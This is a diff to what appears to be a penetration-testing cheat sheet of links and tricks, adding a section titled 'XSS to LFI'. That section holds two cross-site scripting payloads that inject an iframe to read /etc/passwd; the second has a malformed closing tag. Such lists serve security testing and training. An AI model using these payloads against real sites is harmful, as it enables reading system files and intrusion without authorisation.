@@ -14,6 +14,7 @@ https://nmap.org/nsedoc/scripts/http-waf-fingerprint.html
 https://raw.githubusercontent.com/vmfae-iscteiulpt/imperva-detect/master/imperva-detect.sh
 
 ### Finding the direct IP address of a server
+	
 -> IP History  
 https://www.iphistory.ch/en/  
 
@@ -317,6 +318,12 @@ https://syllab.fr/projets/experiments/xcharsjs/5chars.pipeline.html
 ### Decoder - Obfuscation (Javascript Decoder and PHP)
 https://malwaredecoder.com/  
 
+### XSS to LFI
+```
+<img src=x onerror="document.write('<iframe src=file:///etc/passwd></iframe>')"/>
+<script>document.write('<iframe src=file:///etc/passwd></iframe>');</scrip>
+```
+	
 ### XSS - Session Hijacking
 -> Examples
 ```
